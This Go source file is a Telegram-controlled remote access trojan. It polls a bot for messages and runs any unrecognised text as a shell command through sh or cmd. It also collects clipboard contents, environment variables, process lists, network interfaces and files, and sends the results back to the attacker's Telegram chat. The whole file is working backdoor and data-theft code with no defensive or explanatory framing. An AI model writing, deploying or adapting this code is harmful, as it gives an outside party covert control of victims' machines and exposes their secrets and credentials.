package main

import (
	 
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
	"net"
	"github.com/atotto/clipboard"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/process"
	"bytes"
)



type Update struct {
	UpdateID int `json:"update_id"`
	Message  struct {
		Text string `json:"text"`
		Chat struct {
			ID int `json:"id"`
		} `json:"chat"`
	} `json:"message"`
}

type UpdatesResponse struct {
	Result []Update `json:"result"`
}

const (
    TOKEN  = "YOUR_TELEGRAM_BOT_TOKEN"
    CHATID = "YOUR_CHAT_ID"
)

func getUpdates(offset int) []Update {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates?offset=%d&timeout=60", TOKEN, offset)
	resp, err := http.Get(url)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	var updates UpdatesResponse
	json.Unmarshal(body, &updates)
	return updates.Result
}

func executeCommand(command string) string {
	switch command {
	case "info":
		return getSystemInfo()
	case "cpu":
		return getCPUUsage()
	case "ram":
		return getMemoryUsage()
	case "disk":
		return getDiskUsage()
	case "network":
		return getNetworkInfo()
	case "processes":
		return listProcesses()
	 
	case "clipboard":
		return getClipboard()
	case "env":
		return getEnvVars()
	case "ls":
		return listFiles(".")
	 
	default:
		return runShellCommand(command)
	}
} 

func getSystemInfo() string {
	u, _ := user.Current()
	return fmt.Sprintf("OS: %s\nArch: %s\nUser: %s", runtime.GOOS, runtime.GOARCH, u.Username)
}

func getCPUUsage() string {
	percent, _ := cpu.Percent(0, false)
	return fmt.Sprintf("CPU Usage: %.2f%%", percent[0])
}

func getMemoryUsage() string {
	v, _ := mem.VirtualMemory()
	return fmt.Sprintf("RAM Usage: %.2f%%", v.UsedPercent)
}

func getDiskUsage() string {
	d, _ := disk.Usage("/")
	return fmt.Sprintf("Disk Usage: %.2f%%", d.UsedPercent)
}

func getNetworkInfo() string {
	interfaces, _ := net.Interfaces()
	info := ""
	for _, iface := range interfaces {
		info += fmt.Sprintf("Interface: %s, MAC: %s\n", iface.Name, iface.HardwareAddr.String())
	}
	return info
}

func listProcesses() string {
	procs, _ := process.Processes()
	info := "Running Processes:\n"
	for _, p := range procs {
		name, _ := p.Name()
		info += fmt.Sprintf("%d - %s\n", p.Pid, name)
	}
	return info
}

 

func getClipboard() string {
	clip, _ := clipboard.ReadAll()
	return "Clipboard: " + clip
}

func getEnvVars() string {
	return fmt.Sprintf("Env Vars: %v", os.Environ())
}

func listFiles(path string) string {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		return "Error listing files"
	}
	var fileList string
	for _, file := range files {
		fileList += file.Name() + "\n"
	}
	return fileList
}

func runShellCommand(command string) string {
	cmd := exec.Command("sh", "-c", command)
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %s\nOutput: %s", err.Error(), string(output))
	}
	return string(output)
}

func sendMessage(chatID int, text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TOKEN)
	data := map[string]interface{}{
		"chat_id": chatID,
		"text":    text,
	}
	jsonData, _ := json.Marshal(data)
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}

func handleUpdates(updates []Update) int {
	highestUpdateID := 0
	for _, update := range updates {
		if update.Message.Text != "" {
			response := executeCommand(update.Message.Text)
			sendMessage(update.Message.Chat.ID, response)
		}
		if update.UpdateID > highestUpdateID {
			highestUpdateID = update.UpdateID
		}
	}
	return highestUpdateID
}

func main() {
	offset := 0
	for {
		updates := getUpdates(offset)
		if len(updates) > 0 {
			offset = handleUpdates(updates) + 1
		}
		time.Sleep(1 * time.Second)
	}
}
